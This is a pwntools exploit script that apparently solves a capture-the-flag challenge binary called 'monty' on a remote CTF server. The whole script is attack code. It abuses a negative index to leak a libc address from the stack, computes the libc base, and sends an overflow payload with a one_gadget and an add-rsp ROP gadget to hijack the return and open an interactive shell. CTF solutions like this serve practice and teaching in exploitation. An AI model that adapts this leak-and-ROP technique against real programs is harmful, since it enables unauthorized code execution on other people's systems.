#!/usr/bin/env python3
from pwn import *


elf = context.binary = ELF('./monty')
rop = ROP(elf)
context.terminal=['tmux','splitw','-h']

# p = process('./monty')
gdbscript = """
b *game+883
"""
#gdb.attach(p, gdbscript=gdbscript)
p = remote('chall.lac.tf', 31133)

print(p.recv().decode(errors='ignore'))
p.sendline(b'4294967293') # -3

print(p.recv().decode(errors='ignore'))
p.sendline(b'61') # main return

print(p.recv().decode(errors='ignore'))
p.sendline(b'10') # junk

print(p.recv().decode(errors='ignore'))
p.sendline(b'A'*38) # junk

print(p.recv().decode(errors='ignore'))
p.sendline(b'11') # some libc address
resp = p.recv().decode(errors='ignore')
print(resp)
libc_addr = resp[resp.find('Peek 2: ')+8:resp.find('\n==============================\nShow')]
libc_addr = int(libc_addr) - 355398
print(f"LIBC ADDR: {hex(libc_addr)}")

p.sendline(b'80') # junk

add_rsp_gadget = libc_addr + 0xdda03
one_gadget = libc_addr + 0x5004c
print(p.recv().decode(errors='ignore'))
p.sendline(b'W' * 4 + b'\x00' * 4 + b'T' * 16 + p64(one_gadget) + p64(add_rsp_gadget)[:-1])

print(hexdump(one_gadget))

print(p.recv().decode(errors='ignore'))
p.sendline(b'78') # add rsp gadget

print(p.recv().decode(errors='ignore'))
p.sendline(b'61') # main return

print(p.recv().decode(errors='ignore'))
p.sendline(b'1') # junk

print(p.recv().decode(errors='ignore'))
p.sendline(b'D'*38) # junk

p.interactive()
